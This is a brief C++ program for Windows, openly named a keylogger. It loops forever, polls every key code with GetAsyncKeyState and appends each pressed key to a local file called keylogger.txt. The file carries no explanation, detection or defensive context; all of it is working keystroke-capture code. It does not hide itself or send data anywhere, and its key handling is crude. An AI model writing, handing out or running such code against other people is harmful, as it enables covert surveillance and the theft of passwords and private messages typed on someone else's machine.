#include <iostream>
#include <fstream>
#include <Windows.h>

int main() {
    std::ofstream logfile("keylogger.txt", std::ios::app); // Open file in append mode
    if (!logfile.is_open()) {
        std::cerr << "Error: Unable to open log file!" << std::endl;
        return 1;
    }

    while (true) {
        Sleep(100); // Adjust interval as needed
        for (int i = 8; i <= 255; ++i) { // ASCII values for keys
            if (GetAsyncKeyState(i) == -32767) { // Key is pressed
                // Handle key press here
                char key = static_cast<char>(i);
                logfile << "Key pressed: " << key << std::endl;
            }
        }
    }

    logfile.close(); // Close file when done
    return 0;
}
